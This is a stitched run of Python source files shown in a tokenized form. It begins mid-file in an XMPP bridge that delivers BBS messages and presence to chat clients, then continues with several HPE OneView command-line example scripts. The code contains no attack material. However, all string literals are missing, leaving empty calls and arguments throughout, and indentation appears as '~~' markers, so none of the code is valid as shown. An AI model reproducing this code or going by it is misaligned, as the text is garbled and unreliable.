# -21: error when saving message \n 
\n 
~~ ~~ ~~ def make_jid ( self , userid ) : \n 
~~~ return "%s@%s" % ( userid , self . _hostname ) \n 
\n 
~~ def refresh ( self ) : \n 
~~~ self . _userinfo . freshtime = int ( time . time ( ) ) \n 
self . _userinfo . save ( ) \n 
\n 
~~ def ping_result ( self , iq ) : \n 
~~~ self . refresh ( ) \n 
\n 
~~ def ping_client ( self ) : \n 
~~~ try : \n 
~~~ pingelem = self . E . ping ( xmlns = ) \n 
return self . iq ( , self . ping_result , pingelem ) \n 
~~ except Exception as e : \n 
~~~ Log . debug ( "ping client %r failed: %r" % ( self . authJID , e ) ) \n 
Log . debug ( traceback . format_exc ( ) ) \n 
return False \n 
\n 
~~ ~~ def get_uid ( self ) : \n 
~~~ return self . _user . GetUID ( ) \n 
\n 
~~ def recv_msg ( self , from_ , msgtext ) : \n 
# got a new message! send it! \n 
~~~ elem = self . E . message ( { : from_ , : unicode ( self . authJID ) } , \n 
self . E . body ( msgtext ) ) \n 
self . recv ( unicode ( self . authJID ) , elem ) \n 
\n 
~~ def check_msg ( self ) : \n 
~~~ Log . debug ( "checking msg for %s" % self . _userid ) \n 
msgbox = MsgBox . MsgBox ( self . _userid ) \n 
msg_count = msgbox . GetMsgCount ( all = False ) \n 
my_pid = os . getpid ( ) \n 
xmpp_read = self . rosters . get_xmpp_read ( self . _user . GetUID ( ) ) \n 
if xmpp_read > msg_count : \n 
~~~ xmpp_read = 0 \n 
~~ Log . debug ( "total: %d xmpp read: %d" % ( msg_count , xmpp_read ) ) \n 
self . rosters . set_xmpp_read ( self . _user . GetUID ( ) , msg_count ) \n 
if xmpp_read < msg_count : \n 
~~~ return xmpp_read \n 
~~ else : \n 
~~~ return - 1 \n 
\n 
~~ ~~ def deliver_msg ( self , start ) : \n 
~~~ Log . debug ( "deliver msg to %s" % unicode ( self . authJID ) ) \n 
msgbox = MsgBox . MsgBox ( self . _userid ) \n 
msg_count = msgbox . GetMsgCount ( all = False ) \n 
my_pid = os . getpid ( ) \n 
for i in range ( start , msg_count ) : \n 
~~~ msghead = msgbox . LoadMsgHead ( i , all = False ) \n 
if msghead . topid == my_pid : \n 
~~~ msgtext = msgbox . LoadMsgText ( msghead ) \n 
self . recv_msg ( self . make_jid ( msghead . id ) , msgtext ) \n 
\n 
~~ ~~ ~~ def steal_msg ( self ) : \n 
~~~ Log . debug ( "stealing msg for %s" % self . _userid ) \n 
msgbox = MsgBox . MsgBox ( self . _userid ) \n 
msg_count = msgbox . GetMsgCount ( all = False ) \n 
msg_unread = msgbox . GetUnreadCount ( ) \n 
read_count = msg_count - msg_unread \n 
my_pid = os . getpid ( ) \n 
term_read = self . rosters . get_term_read ( self . get_uid ( ) ) \n 
term_stealed = self . rosters . get_term_stealed ( self . get_uid ( ) ) \n 
\n 
all_xmpp = True \n 
new_unread = { } \n 
# these are unread msgs! \n 
for i in range ( read_count - 1 , msg_count ) : \n 
~~~ if i < 0 : # read_count == 0... \n 
~~~ continue \n 
\n 
~~ msghead = msgbox . LoadMsgHead ( i , all = False ) \n 
if i >= read_count and all_xmpp : \n 
~~~ if msghead . topid == my_pid : \n 
# still xmpp \n 
# RACE! \n 
~~~ msgbox . GetUnreadMsg ( ) \n 
~~ else : \n 
# not xmpp \n 
~~~ all_xmpp = False \n 
\n 
~~ ~~ if msghead . topid == my_pid : \n 
\n 
~~~ continue \n 
\n 
~~ if i < read_count : # read_count - 1 \n 
~~~ session = self . rosters . find_session ( self . authJID . bare , msghead . topid ) \n 
if session is None or session . get_mode ( ) != modes . MSG : \n 
~~~ continue \n 
~~ Log . debug ( "considered msg %d as unread" % i ) \n 
\n 
# unread msg! \n 
~~ if msghead . topid not in new_unread : \n 
~~~ Log . debug ( "for pid %d, first unread at %d" % ( msghead . topid , i ) ) \n 
new_unread [ msghead . topid ] = i \n 
\n 
~~ ~~ final_unread = { } \n 
to_steal = { } \n 
to_steal_begin = msg_count \n 
\n 
for pid in term_read : \n 
~~~ if pid in new_unread : \n 
~~~ if new_unread [ pid ] == term_read [ pid ] [ 0 ] : \n 
# still unread \n 
~~~ final_unread [ pid ] = ( term_read [ pid ] [ 0 ] , term_read [ pid ] [ 1 ] + 1 ) \n 
Log . debug ( ".. still unread: %d for %d, %d times" % ( new_unread [ pid ] , pid , term_read [ pid ] [ 1 ] + 1 ) ) \n 
if final_unread [ pid ] [ 1 ] > STEAL_AFTER_SEEN : \n 
~~~ to_steal [ pid ] = final_unread [ pid ] \n 
Log . debug ( ".. let\'s steal! %d+ from %d" % ( to_steal [ pid ] [ 0 ] , pid ) ) \n 
if pid in term_stealed : \n 
~~~ steal_begin = max ( final_unread [ pid ] [ 0 ] , term_stealed [ pid ] + 1 ) \n 
~~ else : \n 
~~~ steal_begin = final_unread [ pid ] [ 0 ] \n 
~~ if steal_begin < to_steal_begin : \n 
~~~ to_steal_begin = steal_begin \n 
~~ ~~ ~~ else : \n 
# moved forward \n 
~~~ final_unread [ pid ] = ( new_unread [ pid ] , 1 ) \n 
Log . debug ( ".. moved: %d->%d for %d" % ( term_read [ pid ] [ 0 ] , new_unread [ pid ] , pid ) ) \n 
~~ ~~ else : \n 
# disappeared? consider as read \n 
~~~ Log . debug ( ".. disappeared: %d" % pid ) \n 
pass \n 
~~ ~~ for pid in new_unread : \n 
~~~ if pid not in term_read : \n 
# new session \n 
~~~ Log . debug ( ".. new unread: %d for %d" % ( new_unread [ pid ] , pid ) ) \n 
final_unread [ pid ] = ( new_unread [ pid ] , 1 ) \n 
\n 
~~ ~~ if to_steal : \n 
~~~ Log . debug ( "steal starting from %d" % to_steal_begin ) \n 
for i in range ( to_steal_begin , msg_count ) : \n 
~~~ msghead = msgbox . LoadMsgHead ( i , all = False ) \n 
if msghead . topid == my_pid : \n 
~~~ Log . debug ( "skip xmpp %d for %d" % ( i , msghead . topid ) ) \n 
msgbox . GetUnreadMsg ( ) \n 
~~ elif msghead . topid in to_steal : \n 
~~~ if msghead . topid not in term_stealed or i > term_stealed [ msghead . topid ] : \n 
~~~ Log . debug ( "steal! %d from %d" % ( i , msghead . topid ) ) \n 
# not stealed... \n 
msgtext = msgbox . LoadMsgText ( msghead ) \n 
self . recv_msg ( self . make_jid ( msghead . id ) , msgtext ) \n 
term_stealed [ msghead . topid ] = i \n 
~~ else : \n 
~~~ Log . debug ( "already stealed: %d from %d" % ( i , msghead . topid ) ) \n 
\n 
~~ ~~ ~~ ~~ self . rosters . set_term_read ( self . get_uid ( ) , final_unread ) \n 
\n 
~~ @ xmpp . stanza ( ) \n 
def presence ( self , elem ) : \n 
~~~ """Presence information may be sent out from the client or\n        received from another account.""" \n 
\n 
Log . warn ( "handle presence. me: %r elem: %r" % ( self . authJID , elem_to_str ( elem ) ) ) \n 
if self . authJID == elem . get ( ) : \n 
~~~ if ( elem . get ( ) == None or ( not self . authJID . match_bare ( elem . get ( ) ) ) ) : \n 
~~~ return self . send_presence ( elem ) \n 
~~ ~~ self . recv_presence ( elem ) \n 
\n 
~~ def send_presence ( self , elem ) : \n 
~~~ Log . warn ( "send_presence me: %r elem: %r" % ( self . authJID , elem_to_str ( elem ) ) ) \n 
# we want to send a presence \n 
direct = elem . get ( ) \n 
if not direct : \n 
# not sending directly to one JID \n 
# send to everyone who is watching me \n 
~~~ self . rosters . broadcast ( self , elem ) \n 
if elem . get ( ) != : \n 
# if it is not a probe, send a copy to the client also \n 
~~~ self . recv_presence ( elem ) \n 
~~ if not self . probed : \n 
# if we have not probed our watch list, probe them \n 
~~~ self . probed = True \n 
self . rosters . probe ( self ) \n 
# check if rosters will handle this  \n 
~~ ~~ elif not self . rosters . send ( self , direct , elem ) : \n 
# if not, send it to the JID specified \n 
~~~ self . send ( direct , elem ) \n 
\n 
~~ ~~ def recv_presence ( self , elem ) : \n 
~~~ Log . warn ( "recv_presence me: %r elem: %r" % ( self . authJID , elem_to_str ( elem ) ) ) \n 
# we got a precense \n 
# check if rosters will handle this \n 
if not self . rosters . recv ( self , elem ) : \n 
# if not, send this to the client \n 
~~~ Log . warn ( "\\tsending it to client" ) \n 
self . write ( elem ) \n 
\n 
~~ ~~ @ xmpp . iq ( ) \n 
def roster ( self , iq ) : \n 
~~~ """A roster is this account\'s list of contacts; it may be\n        fetched or updated.""" \n 
\n 
roster = self . rosters . get ( self ) \n 
method = getattr ( self , % iq . get ( ) ) \n 
return method and method ( iq , roster ) \n 
\n 
~~ def get_roster ( self , iq , roster ) : \n 
~~~ query = self . E . query ( { : } ) \n 
for item in roster . items ( ) : \n 
~~~ query . append ( item ) \n 
~~ return self . iq ( , iq , query ) \n 
\n 
~~ def set_roster ( self , iq , roster ) : \n 
~~~ query = self . E . query ( xmlns = ) \n 
for item in iq [ 0 ] : \n 
~~~ result = roster . set ( item ) \n 
if result is not None : \n 
~~~ query . append ( result ) \n 
~~ ~~ if len ( query ) > 0 : \n 
~~~ self . push ( roster , query ) \n 
~~ return self . iq ( , iq ) \n 
\n 
~~ def push ( self , roster , query ) : \n 
~~~ """Push roster changes to all clients that have requested this\n        roster.""" \n 
\n 
for jid in roster . requests ( ) : \n 
~~~ for ( to , route ) in self . routes ( jid ) : \n 
~~~ route . iq ( , self . ignore , query ) \n 
\n 
~~ ~~ ~~ def ignore ( self , iq ) : \n 
~~~ """An IQ no-op.""" \n 
\n 
~~ @ xmpp . iq ( ) \n 
def vcard ( self , iq ) : \n 
~~~ """vCard support: the client requests its vCard after\n        establishing a session.""" \n 
\n 
if iq . get ( ) == : \n 
~~~ if ( iq . get ( ) == None ) : \n 
~~~ target = iq . get ( ) \n 
~~ else : \n 
~~~ target = iq . get ( ) \n 
\n 
~~ form_target = UCache . UCache . formalize_jid ( target ) \n 
name = form_target . partition ( ) [ 0 ] \n 
user = UserManager . UserManager . LoadUser ( name ) \n 
info = user . GetInfo ( ) \n 
desc = % ( info [ ] , info [ ] , info [ ] , \n 
info [ ] , info [ ] , info [ ] , info [ ] ) \n 
if ( in info ) : \n 
~~~ desc += "Plan:\\r%s" % ( info [ ] . replace ( , ) ) \n 
\n 
~~ vcard = self . E . vCard ( { : } , \n 
self . E ( , name ) , \n 
self . E ( , Util . Util . RemoveTags ( info [ ] ) ) , \n 
self . E ( , Util . Util . RemoveTags ( desc ) ) ) \n 
\n 
if ( iq . get ( ) == None ) : \n 
~~~ return self . iq ( , iq , vcard ) \n 
~~ else : \n 
~~~ return self . iq ( , iq , vcard , { : iq . get ( ) } ) \n 
\n 
~~ ~~ ~~ @ xmpp . iq ( % __disco_info_ns__ ) \n 
def disco_info ( self , iq ) : \n 
~~~ """ Service Discovery: disco#info """ \n 
\n 
target = iq . get ( ) \n 
\n 
if ( target . find ( ) < 0 ) : \n 
# query server info \n 
~~~ query = self . E . query ( { : __disco_info_ns__ } , \n 
self . E . identity ( { : , \n 
: , \n 
: Config . Config . GetString ( , ) , \n 
} ) ) \n 
features = [ __disco_info_ns__ , __disco_items_ns__ , __vcard_ns__ ] \n 
for feature in features : \n 
~~~ query . append ( self . E . feature ( { : feature } ) ) \n 
\n 
~~ ~~ else : \n 
# query client info \n 
~~~ query = self . E . query ( { : __disco_info_ns__ } , \n 
self . E . identity ( { : , \n 
: , \n 
: Config . Config . GetString ( , ) , \n 
} ) ) \n 
\n 
features = [ __disco_info_ns__ , __disco_items_ns__ , __vcard_ns__ ] \n 
for feature in features : \n 
~~~ query . append ( self . E . feature ( { : feature } ) ) \n 
\n 
~~ ~~ return self . iq ( , iq , query , { : target } ) \n 
\n 
\n 
~~ @ xmpp . iq ( % __disco_items_ns__ ) \n 
def disco_items ( self , iq ) : \n 
~~~ """ Service Discovery: disco#items """ \n 
\n 
target = iq . get ( ) \n 
\n 
if ( target . find ( ) < 0 ) : \n 
# query server info \n 
~~~ query = self . E . query ( { : __disco_items_ns__ } ) \n 
\n 
~~ else : \n 
# query client info \n 
~~~ query = self . E . query ( { : __disco_items_ns__ } ) \n 
\n 
~~ return self . iq ( , iq , query , { : target } ) \n 
\n 
\n 
#!/usr/bin/env python \n 
### \n 
# (C) Copyright (2012-2016) Hewlett Packard Enterprise Development LP \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
### \n 
~~ ~~ from __future__ import print_function \n 
from __future__ import unicode_literals \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
from builtins import range \n 
from future import standard_library \n 
standard_library . install_aliases ( ) \n 
import sys \n 
\n 
PYTHON_VERSION = sys . version_info [ : 3 ] \n 
PY2 = ( PYTHON_VERSION [ 0 ] == 2 ) \n 
if PY2 : \n 
~~~ if PYTHON_VERSION < ( 2 , 7 , 9 ) : \n 
~~~ raise Exception ( ) \n 
~~ ~~ elif PYTHON_VERSION < ( 3 , 4 ) : \n 
~~~ raise Exception ( ) \n 
\n 
~~ import hpOneView as hpov \n 
from pprint import pprint \n 
import json \n 
from hpOneView . common import uri \n 
import hpOneView . profile as profile \n 
\n 
\n 
def acceptEULA ( con ) : \n 
# See if we need to accept the EULA before we try to log in \n 
~~~ con . get_eula_status ( ) \n 
try : \n 
~~~ if con . get_eula_status ( ) is True : \n 
~~~ print ( ) \n 
con . set_eula ( ) \n 
~~ ~~ except Exception as e : \n 
~~~ print ( ) \n 
print ( e ) \n 
\n 
\n 
~~ ~~ def login ( con , credential ) : \n 
# Login with given credentials \n 
~~~ try : \n 
~~~ con . login ( credential ) \n 
~~ except : \n 
~~~ print ( ) \n 
\n 
\n 
~~ ~~ def get_eg_uri_from_arg ( srv , name ) : \n 
~~~ if srv and name : \n 
~~~ if name . startswith ( ) and uri [ ] in name : \n 
~~~ return name \n 
~~ else : \n 
~~~ egs = srv . get_enclosure_groups ( ) \n 
for eg in egs : \n 
~~~ if eg [ ] == name : \n 
~~~ return eg [ ] \n 
~~ ~~ ~~ ~~ return None \n 
\n 
\n 
~~ def get_sht_from_arg ( srv , name ) : \n 
~~~ if srv and name : \n 
~~~ if name . startswith ( ) and uri [ ] in name : \n 
~~~ return name \n 
~~ else : \n 
~~~ shts = srv . get_server_hardware_types ( ) \n 
for sht in shts : \n 
~~~ if sht [ ] == name : \n 
~~~ return sht \n 
~~ ~~ ~~ ~~ return None \n 
\n 
\n 
~~ def define_profile_template ( \n 
srv , \n 
name , \n 
desc , \n 
sp_desc , \n 
server_hwt , \n 
enc_group , \n 
affinity , \n 
hide_flexnics , \n 
conn_list , \n 
fw_settings , \n 
boot , \n 
bootmode ) : \n 
\n 
~~~ if conn_list : \n 
# read connection list from file \n 
~~~ conn = json . loads ( open ( conn_list ) . read ( ) ) \n 
~~ else : \n 
~~~ conn = [ ] \n 
\n 
~~ profile_template = srv . create_server_profile_template ( \n 
name = name , \n 
description = desc , \n 
serverProfileDescription = sp_desc , \n 
serverHardwareTypeUri = server_hwt , \n 
enclosureGroupUri = enc_group , \n 
affinity = affinity , \n 
hideUnusedFlexNics = hide_flexnics , \n 
profileConnectionV4 = conn , \n 
firmwareSettingsV3 = fw_settings , \n 
bootSettings = boot , \n 
bootModeSetting = bootmode ) \n 
\n 
if in profile_template : \n 
~~~ print ( , profile_template [ ] ) \n 
print ( , profile_template [ ] ) \n 
print ( , profile_template [ ] ) \n 
print ( , profile_template [ ] ) \n 
print ( ) \n 
for connection in profile_template [ ] : \n 
~~~ print ( , connection [ ] ) \n 
print ( , connection [ ] ) \n 
print ( , connection [ ] ) \n 
~~ print ( ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( , profile_template [ ] [ ] , ) \n 
~~ else : \n 
~~~ pprint ( profile_template ) \n 
\n 
\n 
~~ ~~ def main ( ) : \n 
~~~ parser = argparse . ArgumentParser ( add_help = True , \n 
formatter_class = argparse . RawTextHelpFormatter , \n 
description = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = False , choices = [ , ] , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = False , choices = [ , ] , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
action = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
nargs = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
choices = [ , , ] , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
choices = [ , , , \n 
, ] , \n 
default = , \n 
help = ) \n 
\n 
args = parser . parse_args ( ) \n 
credential = { : args . user , : args . passwd } \n 
\n 
con = hpov . connection ( args . host ) \n 
srv = hpov . servers ( con ) \n 
sts = hpov . settings ( con ) \n 
\n 
if args . proxy : \n 
~~~ con . set_proxy ( args . proxy . split ( ) [ 0 ] , args . proxy . split ( ) [ 1 ] ) \n 
~~ if args . cert : \n 
~~~ con . set_trusted_ssl_bundle ( args . cert ) \n 
\n 
~~ login ( con , credential ) \n 
acceptEULA ( con ) \n 
\n 
eg_uri = get_eg_uri_from_arg ( srv , args . enc_group ) \n 
\n 
sht = get_sht_from_arg ( srv , args . server_hwt ) \n 
\n 
fw_settings = profile . make_firmware_dict ( sts , args . baseline ) \n 
\n 
boot , bootmode = profile . make_boot_settings_dict ( srv , sht , args . disable_manage_boot , \n 
args . boot_order , args . boot_mode , args . pxe ) \n 
\n 
define_profile_template ( srv , \n 
args . name , \n 
args . desc , \n 
args . sp_desc , \n 
sht [ ] , \n 
eg_uri , \n 
args . affinity , \n 
args . hide_flexnics , \n 
args . conn_list , \n 
fw_settings , \n 
boot , \n 
bootmode ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ import argparse \n 
sys . exit ( main ( ) ) \n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
#!/usr/bin/env python \n 
### \n 
# (C) Copyright (2012-2015) Hewlett Packard Enterprise Development LP \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
### \n 
~~ from __future__ import print_function \n 
from __future__ import unicode_literals \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
from builtins import range \n 
from future import standard_library \n 
standard_library . install_aliases ( ) \n 
import sys \n 
\n 
PYTHON_VERSION = sys . version_info [ : 3 ] \n 
PY2 = ( PYTHON_VERSION [ 0 ] == 2 ) \n 
if PY2 : \n 
~~~ if PYTHON_VERSION < ( 2 , 7 , 9 ) : \n 
~~~ raise Exception ( ) \n 
~~ ~~ elif PYTHON_VERSION < ( 3 , 4 ) : \n 
~~~ raise Exception ( ) \n 
\n 
~~ import hpOneView as hpov \n 
from pprint import pprint \n 
\n 
\n 
def acceptEULA ( con ) : \n 
# See if we need to accept the EULA before we try to log in \n 
~~~ con . get_eula_status ( ) \n 
try : \n 
~~~ if con . get_eula_status ( ) is True : \n 
~~~ print ( "EULA display needed" ) \n 
con . set_eula ( ) \n 
~~ ~~ except Exception as e : \n 
~~~ print ( ) \n 
print ( e ) \n 
\n 
\n 
~~ ~~ def login ( con , credential ) : \n 
# Login with givin credentials \n 
~~~ try : \n 
~~~ con . login ( credential ) \n 
~~ except : \n 
~~~ print ( ) \n 
\n 
\n 
~~ ~~ def get_address_pools ( con , srv , types ) : \n 
~~~ if types == or types == : \n 
~~~ vmac = srv . get_vmac_pool ( ) \n 
print ( ) \n 
for key in sorted ( vmac ) : \n 
~~~ print ( . format ( key , vmac [ key ] ) ) \n 
~~ if in vmac : \n 
~~~ for uri in vmac [ ] : \n 
~~~ ranges = con . get ( uri ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
~~ ~~ ~~ if types == or types == : \n 
~~~ vwwn = srv . get_vwwn_pool ( ) \n 
print ( ) \n 
for key in sorted ( vwwn ) : \n 
~~~ print ( . format ( key , vwwn [ key ] ) ) \n 
~~ if in vwwn : \n 
~~~ for uri in vwwn [ ] : \n 
~~~ ranges = con . get ( uri ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
~~ ~~ ~~ if types == or types == : \n 
~~~ vsn = srv . get_vsn_pool ( ) \n 
print ( ) \n 
for key in sorted ( vsn ) : \n 
~~~ print ( . format ( key , vsn [ key ] ) ) \n 
~~ if in vsn : \n 
~~~ for uri in vsn [ ] : \n 
~~~ ranges = con . get ( uri ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
print ( , ranges [ ] ) \n 
\n 
\n 
~~ ~~ ~~ ~~ def main ( ) : \n 
~~~ parser = argparse . ArgumentParser ( add_help = True , \n 
formatter_class = argparse . RawTextHelpFormatter , \n 
description = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
choices = [ , , , ] , default = , \n 
help = ) \n 
\n 
args = parser . parse_args ( ) \n 
credential = { : args . domain . upper ( ) , : args . user , : args . passwd } \n 
\n 
con = hpov . connection ( args . host ) \n 
srv = hpov . servers ( con ) \n 
\n 
if args . proxy : \n 
~~~ con . set_proxy ( args . proxy . split ( ) [ 0 ] , args . proxy . split ( ) [ 1 ] ) \n 
~~ if args . cert : \n 
~~~ con . set_trusted_ssl_bundle ( args . cert ) \n 
\n 
~~ login ( con , credential ) \n 
acceptEULA ( con ) \n 
\n 
get_address_pools ( con , srv , args . types ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ import sys \n 
import argparse \n 
sys . exit ( main ( ) ) \n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
#!/usr/bin/env python \n 
### \n 
# (C) Copyright (2012-2015) Hewlett Packard Enterprise Development LP \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
### \n 
~~ from __future__ import print_function \n 
from __future__ import unicode_literals \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
from builtins import range \n 
from future import standard_library \n 
standard_library . install_aliases ( ) \n 
import sys \n 
import re \n 
\n 
PYTHON_VERSION = sys . version_info [ : 3 ] \n 
PY2 = ( PYTHON_VERSION [ 0 ] == 2 ) \n 
if PY2 : \n 
~~~ if PYTHON_VERSION < ( 2 , 7 , 9 ) : \n 
~~~ raise Exception ( ) \n 
~~ ~~ elif PYTHON_VERSION < ( 3 , 4 ) : \n 
~~~ raise Exception ( ) \n 
\n 
~~ import hpOneView as hpov \n 
from pprint import pprint \n 
\n 
\n 
def acceptEULA ( con ) : \n 
# See if we need to accept the EULA before we try to log in \n 
~~~ con . get_eula_status ( ) \n 
try : \n 
~~~ if con . get_eula_status ( ) is True : \n 
~~~ print ( ) \n 
con . set_eula ( ) \n 
~~ ~~ except Exception as e : \n 
~~~ print ( ) \n 
print ( e ) \n 
\n 
\n 
~~ ~~ def login ( con , credential ) : \n 
# Login with givin credentials \n 
~~~ try : \n 
~~~ con . login ( credential ) \n 
~~ except : \n 
~~~ print ( ) \n 
\n 
\n 
~~ ~~ def get_managed_sans ( fcs ) : \n 
~~~ sans = fcs . get_managed_sans ( ) \n 
pprint ( sans ) \n 
\n 
\n 
~~ def main ( ) : \n 
~~~ parser = argparse . ArgumentParser ( add_help = True , \n 
formatter_class = argparse . RawTextHelpFormatter , \n 
description = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
\n 
args = parser . parse_args ( ) \n 
credential = { : args . domain . upper ( ) , : args . user , : args . passwd } \n 
\n 
con = hpov . connection ( args . host ) \n 
fcs = hpov . fcsans ( con ) \n 
\n 
if args . proxy : \n 
~~~ con . set_proxy ( args . proxy . split ( ) [ 0 ] , args . proxy . split ( ) [ 1 ] ) \n 
~~ if args . cert : \n 
~~~ con . set_trusted_ssl_bundle ( args . cert ) \n 
\n 
~~ login ( con , credential ) \n 
acceptEULA ( con ) \n 
\n 
get_managed_sans ( fcs ) \n 
\n 
~~ if __name__ == : \n 
~~~ import sys \n 
import argparse \n 
sys . exit ( main ( ) ) \n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
#!/usr/bin/env python \n 
### \n 
# (C) Copyright (2012-2015) Hewlett Packard Enterprise Development LP \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
### \n 
